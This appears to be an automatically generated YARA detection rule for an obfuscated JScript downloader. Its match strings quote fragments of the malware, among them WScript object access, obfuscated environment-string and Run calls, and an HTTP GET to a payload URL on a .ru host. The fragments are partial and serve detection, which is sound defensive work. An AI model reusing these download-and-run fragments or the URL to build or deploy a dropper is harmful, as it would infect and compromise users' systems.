rule sig_20160428_2229ed7881b8ef6a741170169906ce16 {
  meta:
    description = "datamaliciousorder - file 20160428_2229ed7881b8ef6a741170169906ce16.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b05fd7b1eadb959cf623a082fdafa3a7e2fbb110cd5340af4aee5b1cbe80ad09"

  strings:
    $s1  = "function WibKriEzyMkkGeaQiiViv(EarCfhMrxGghOpyZjvCdg){TdyDbwVwiQxzOqlLmaPhq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function HfqOegWskPkgUahIzuEie() {return TdyDbwVwiQxzOqlLmaPhq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function WibKriEzyMkkGeaQiiViv(EarCfhMrxGghOpyZjvCdg){TdyDbwVwiQxzOqlLmaPhq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return EqyIbqYbzHtoRxmQnbYhh - FslGzsAssCzzMbhYoiQrw;};" fullword ascii
    $s5  = "function QijNixLdpZwyFelLuzWyo(EqyIbqYbzHtoRxmQnbYhh, FslGzsAssCzzMbhYoiQrw){KsyNtrFdqCrpJnzItkKow = KsyNtrFdqCrpJnzItkKow * 1; " ascii
    $s6  = "OmoVslXrpXrsJuyUvpDss[FtcVqqZqhWevWhwIupAfa](\"G\" + \"ET\", \"http://unipan96.ru/xo5ksp\", false);" fullword ascii
    $s7  = "var CsyMfxAlpXegAtlJlaReh = this[\"WScript\"];" fullword ascii
    $s8  = "function HfqOegWskPkgUahIzuEie() {return TdyDbwVwiQxzOqlLmaPhq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function CrxKnyToaKmxVgaLgnIhs(){return HveDhpDjmGweQnhFvvHqd + \"\";};" fullword ascii
    $s10 = "var TdyDbwVwiQxzOqlLmaPhq = function KinZlePodOthHsnAcaJui() {return CsyMfxAlpXegAtlJlaReh[DxhXspRceVltFafPukTyq](\"WScript\"+\"" ascii
    $s11 = "if (OmoVslXrpXrsJuyUvpDss[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function QijNixLdpZwyFelLuzWyo(EqyIbqYbzHtoRxmQnbYhh, FslGzsAssCzzMbhYoiQrw){KsyNtrFdqCrpJnzItkKow = KsyNtrFdqCrpJnzItkKow * 1; " ascii
    $s13 = "function SerCpaReeEtmWsnAelYwm() {return ((WjoJnvZupZclJjkAwkWzl == true) && (WjoJnvZupZclJjkAwkWzl == JdbOofBdeXgkNsaSwuJmh)) ?" ascii
    $s14 = "function SerCpaReeEtmWsnAelYwm() {return ((WjoJnvZupZclJjkAwkWzl == true) && (WjoJnvZupZclJjkAwkWzl == JdbOofBdeXgkNsaSwuJmh)) ?" ascii
    $s15 = "var TdyDbwVwiQxzOqlLmaPhq = function KinZlePodOthHsnAcaJui() {return CsyMfxAlpXegAtlJlaReh[DxhXspRceVltFafPukTyq](\"WScript\"+\"" ascii
    $s16 = "}while (BxpCypRudIxfIruConNkc);" fullword ascii
    $s17 = "var EyuQzlYbfQlbKykOitBup = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "var WjoJnvZupZclJjkAwkWzl = false;" fullword ascii
    $s19 = "function BbbPmqPnvTnqPsyMmsAdp(){return DxhXspRceVltFafPukTyq;};" fullword ascii
    $s20 = "function UnfKdxHbpHmhZulIvcLwt()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}